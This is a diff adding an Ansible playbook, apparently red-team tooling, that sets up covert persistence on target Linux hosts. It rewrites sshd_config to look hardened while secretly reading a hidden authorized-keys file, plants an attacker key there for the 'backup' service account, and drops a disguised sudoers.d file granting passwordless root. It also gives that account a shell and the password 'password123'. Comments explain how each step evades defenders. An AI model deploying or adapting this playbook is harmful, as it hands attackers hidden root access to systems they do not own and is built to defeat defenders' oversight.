@@ -1,0 +1,79 @@
+# playbooks/service_misconfig_persistence.yml
+---
+- name: Service Misconfiguration Persistence
+  hosts: targets
+  become: yes
+  gather_facts: yes
+
+  vars:
+    ssh_backdoor_user: "backup"        # abuse an existing service account
+    attacker_pub_key: "ssh-rsa AAAA... your_public_key_here"
+
+  tasks:
+
+    # --- SSH MISCONFIGURATION ---
+
+    - name: Harden sshd_config (looks defensive, actually opens backdoors)
+      lineinfile:
+        path: /etc/ssh/sshd_config
+        regexp: "{{ item.regexp }}"
+        line: "{{ item.line }}"
+        state: present
+      loop:
+        - { regexp: '^#?PermitRootLogin', line: 'PermitRootLogin prohibit-password' }
+        - { regexp: '^#?AuthorizedKeysFile', line: 'AuthorizedKeysFile .ssh/authorized_keys .ssh/.cache' }  # adds hidden second key file
+        - { regexp: '^#?DebianBanner', line: 'DebianBanner no' }
+        - { regexp: '^#?MaxAuthTries', line: 'MaxAuthTries 6' }
+
+    # The sneaky part — blue team sees what looks like
+    # a locked down sshd_config, but AuthorizedKeysFile
+    # now also reads from .ssh/.cache which they won't notice
+
+    - name: Ensure .ssh directory exists for backup user
+      file:
+        path: /home/{{ ssh_backdoor_user }}/.ssh
+        state: directory
+        mode: '0700'
+        owner: "{{ ssh_backdoor_user }}"
+
+    - name: Plant key in the hidden authorized keys file
+      authorized_key:
+        user: "{{ ssh_backdoor_user }}"
+        key: "{{ attacker_pub_key }}"
+        path: /home/{{ ssh_backdoor_user }}/.ssh/.cache   # hidden file, matches sshd_config above
+        manage_dir: no
+
+    - name: Restart SSH to apply config
+      service:
+        name: ssh
+        state: restarted
+
+    # --- SUDOERS MISCONFIGURATION ---
+
+    - name: Drop a sudoers rule buried in sudoers.d
+      copy:
+        dest: /etc/sudoers.d/99-sys-defaults        # named to look like a system default
+        mode: '0440'
+        owner: root
+        group: root
+        validate: /usr/sbin/visudo -cf %s            # won't deploy if syntax is wrong
+        content: |
+          # Default system hardening overrides
+          Defaults        env_reset
+          Defaults        secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
+          backup  ALL=(ALL) NOPASSWD: ALL
+
+    # --- MAKE BACKUP USER LOGIN-CAPABLE ---
+
+    - name: Give backup user a shell (service accounts have nologin by default)
+      user:
+        name: "{{ ssh_backdoor_user }}"
+        shell: /bin/bash
+        password: "{{ 'password123' | password_hash('sha512') }}"
+
+    - name: Ensure backup user has a home directory
+      file:
+        path: /home/{{ ssh_backdoor_user }}
+        state: directory
+        owner: "{{ ssh_backdoor_user }}"
+        mode: '0750'
